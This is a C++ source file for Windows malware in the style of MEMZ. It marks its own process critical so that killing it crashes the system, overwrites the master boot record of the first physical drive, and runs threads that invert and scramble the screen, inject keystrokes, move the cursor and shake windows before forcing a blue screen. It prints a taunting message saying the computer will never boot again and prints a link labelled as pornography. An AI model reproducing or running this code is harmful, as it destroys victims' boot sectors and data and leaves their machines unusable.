#include <windows.h>
#include <time.h>
#include <Mmsystem.h>
#include <TlHelp32.h>
#include <Shlwapi.h>
#include <Psapi.h>
#include <CommCtrl.h>
#include <tchar.h>
#include "binary.h"
#include <stdio.h>
#include <stdlib.h>
#include<bits/stdc++.h>
//#define DEBUG debug
 
int milisecsfor = 3000;
int milisecsforKeyb = 15000;
int milisecEx = 0;
int msForC = 600;
int mcForT = 2500;
//#pragma comment(linker,"-lgdi32")

int PayloadBlink(){
	HWND hwnd = GetDesktopWindow();
	HDC hdc = GetWindowDC(hwnd);
	RECT rekt;
	GetWindowRect(hwnd, &rekt);
	BitBlt(hdc, 0, 0, rekt.right - rekt.left, rekt.bottom - rekt.top, hdc, 0, 0, NOTSRCCOPY);
	ReleaseDC(hwnd, hdc);
	return 1;
}
DWORD WINAPI PayloadWindowShake(LPVOID parameters){
	srand(time(0));
	while(1){
		Sleep(1);
		if(milisecEx >= 4000) {
				RECT rect;//RECT是一个矩形结构体，相当于保存矩形边框的四个坐标
    HWND hwnd = NULL;//两个窗口句柄
    int x, y, width, height;//保存窗口横纵坐标及高度，宽度
    int sure=0;
        hwnd = GetForegroundWindow();//获取活动窗口句柄'
            GetWindowRect(hwnd, &rect);//获取指定窗口位置
            x = rect.left;
            y = rect.top;
            width = rect.right - x;
            height = rect.bottom - y;
        MoveWindow(hwnd, x +rand()%9-4, y+rand()%9-4, width, height, TRUE);
        Sleep(1);
		}
	}
}
int PayloadCurs(){

	POINT cursor;
	GetCursorPos(&cursor);
	SetCursorPos(cursor.x + (rand() % 3 - 1), cursor.y + (rand() % 3 - 1));

	return 0;
}
DWORD WINAPI PayloadForC(LPVOID parameter) {
	srand(time(0));
	while(1){
		if (milisecEx < 1200)
			Sleep(1);
		if (milisecEx >= 1200){
		PayloadCurs();
		Sleep(msForC);
		if (msForC > 1) {
			msForC--;
		}}
	}
}
int payloadKeyboard() {
	INPUT input;
	input.type = INPUT_KEYBOARD;
	input.ki.wVk = (rand() % (0x5a - 0x30)) + 0x30;
	SendInput(1, &input, sizeof(INPUT));

	return 300 + (rand() % 400);
}
DWORD WINAPI PayloadForKeyB(LPVOID parameter) {
	srand(time(0));
	while(1){
		Sleep(1);
		if (milisecEx >= 6000){
		Sleep(milisecsforKeyb);
		if(milisecsforKeyb > 10)
			milisecsforKeyb--;
		payloadKeyboard();}
	}
}
DWORD WINAPI PayloadTunnel(LPVOID parameter){
	while(true){
	Sleep(1);
	if(milisecEx >= 7500) {
	int a = GetSystemMetrics(SM_CXSCREEN);
	int b = GetSystemMetrics(SM_CYSCREEN);
	StretchBlt(GetDC(NULL), 50, 50, a - 100, b - 100, GetDC(NULL), 0, 0, a, b, SRCCOPY);
	Sleep(mcForT);
	if(mcForT > 30)
		mcForT--;
	}}//yra
}
DWORD WINAPI PayloadForB(LPVOID parameter){
	
	while(1){
		Sleep(1);
		if (milisecEx >= 3000){
		milisecsfor--;
		PayloadBlink();
		Sleep(milisecsfor);}
	}
}
DWORD WINAPI Freez(LPVOID parameter){
	
	while(1){
		Sleep(0);
	}
}
DWORD WINAPI Timer(LPVOID parameter){
	while(1){
		milisecEx++;
		#ifdef DEBUG
		if (milisecEx >= 50000) {
			ExitProcess(114514);
		}
		#else
		if (milisecEx >= 48700 && milisecEx < 50000 && milisecEx % 100 == 0) {
			CreateThread(NULL, NULL, &Freez, NULL, NULL, NULL);
		}
		if (milisecEx >= 50000) {
			BSOD(0xc0114514);
		}
		#endif
		Sleep(1);
	}
}

DWORD WINAPI SoundByeep(LPVOID parameter){
	srand(time(0));
	while (1){
		Sleep(1);
	if(milisecEx % 20 == 0 && milisecEx >= 2100){
		Beep(rand()%8193,100);
	}}
}
DWORD WINAPI PayloadErr(LPVOID parameter){
	srand(time(0));
	while(TRUE){
		Sleep(1);
	if (milisecEx >= 2000){
	int ix = GetSystemMetrics(SM_CXICON) / 2;
	int iy = GetSystemMetrics(SM_CYICON) / 2;
	
	HWND hwnd = GetDesktopWindow();
	HDC hdc = GetWindowDC(hwnd);
//PlaySoundA(sounds[random() % nSounds], GetModuleHandle(NULL), SND_ASYNC);
	POINT cursor;
	GetCursorPos(&cursor);

	DrawIcon(hdc, cursor.x - ix, cursor.y - iy, LoadIcon(NULL, IDI_ERROR));
	if (rand()%50 == 0){
	DrawIcon(hdc, rand()%2200, rand()%2000, LoadIcon(NULL, IDI_WARNING));}

	
	ReleaseDC(hwnd, hdc);}
}
}
DWORD WINAPI PayloadScr(LPVOID parameter){
	srand(time(0));
	while(1){
		Sleep(1);
	if (milisecEx > 6500){
	int X,Y;
	X=GetSystemMetrics(SM_CXSCREEN);
	int pixel;
	HDC hdc = GetDC(0);
	Y=GetSystemMetrics(SM_CYSCREEN);
		for(int i=0;i<=X;i++){
		    for(int j=0;j<=Y;j++){
				pixel=RGB(rand()%255,rand()%255,rand()%255);
				#ifndef __cplusplus
				#ERROR not c++
				#endif
					SetPixel(hdc,i,j,pixel);
				#ifndef __cplusplus
				
				#endif
				
			}
		}
	Sleep(500);
	}}
}
int color(int a) {
	SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE),a);
	return 0;
}
int main(int argc, char* argv[]){
#ifndef DEBUG
    BOOL Flag;
    BOOL ExcOcc = FALSE;
    DWORD pid = GetCurrentProcessId();
    if(pid == 0) {
        printf("Unoccurrable exception occurred!\n");
        ExcOcc = TRUE;
        return 0;
    }
    else {
        Flag = TRUE;
    }
    if (!ExcOcc){
	
   		EnableDebugPrivilege(TRUE);
    	HANDLE hProcess;
    	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    	CallNtSetInformationProcess(hProcess, Flag);
	}
	HANDLE hDevice;
	DWORD dwBytesWritten, dwBytesReturned;
	BYTE pMBR[4096] = {0};
	
	// 重新构造MBR
	memcpy(pMBR, NyanMBR, sizeof(NyanMBR) - 1);
	pMBR[510] = 0x55;
	pMBR[511] = 0xAA;
	
	hDevice = CreateFile
		(
		"\\\\.\\PHYSICALDRIVE0",
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		0,
		NULL
		);
	if (hDevice == INVALID_HANDLE_VALUE)
		return 0;
	DeviceIoControl
		(
		hDevice, 
		FSCTL_LOCK_VOLUME, 
		NULL, 
		0, 
		NULL, 
		0, 
		&dwBytesReturned, 
		NULL
		);
	// 写入MEMZ MBR内容
	WriteFile(hDevice, pMBR, sizeof(pMBR), &dwBytesWritten, NULL);
	DeviceIoControl
		(
		hDevice, 
		FSCTL_UNLOCK_VOLUME, 
		NULL, 
		0, 
		NULL, 
		0, 
		&dwBytesReturned, 
		NULL
		);
	CloseHandle(hDevice);

#else
#endif
	srand(time(0));
	int R,G,B;
	CreateThread(NULL, NULL, &PayloadForC, NULL, NULL, NULL);
	CreateThread(NULL, NULL, &PayloadForB, NULL, NULL, NULL);
	CreateThread(NULL, NULL, &PayloadForKeyB, NULL, NULL, NULL);
	CreateThread(NULL, NULL, &PayloadScr, NULL, NULL, NULL);
	CreateThread(NULL, NULL, &Timer, NULL, NULL, NULL);
	CreateThread(NULL, NULL, &PayloadTunnel, NULL, NULL, NULL);
	CreateThread(NULL, NULL, &PayloadWindowShake, NULL, NULL, NULL);
	CreateThread(NULL, NULL, &PayloadErr, NULL, NULL, NULL);
	CreateThread(NULL, NULL, &SoundByeep, NULL, NULL, NULL);
	HWND hwnd=GetDesktopWindow();
	HDC hdc = GetDC(0);
	char fuck;
	printf("Your computer has been fucked by LXZY!(not masturbation)(why did I say that)\nNow your computer will not boot up again!\nPS: If you end the virus task, your computer will BSOD suddenly. So don't try it.\nEnjoy the LAST TIME with your computer! :D\n\n");
	for(int idonno = 0;idonno<= 1500;idonno++){
		color(rand() % 8193);
		fuck = rand() % 95 + 32;
		printf("%c", fuck);
	}
	//4r8raipkrhl0ljeq
		FreeConsole();
		printf("pornographics: https://partnersearch.yandex.kz/video/preview/4997506981591129149?noreask=1");
	while(1){
		Sleep(1);
	}
	/* Return TRUE on success, FALSE on failure */ //taskkill /f /im main.exe
	return 0;
}
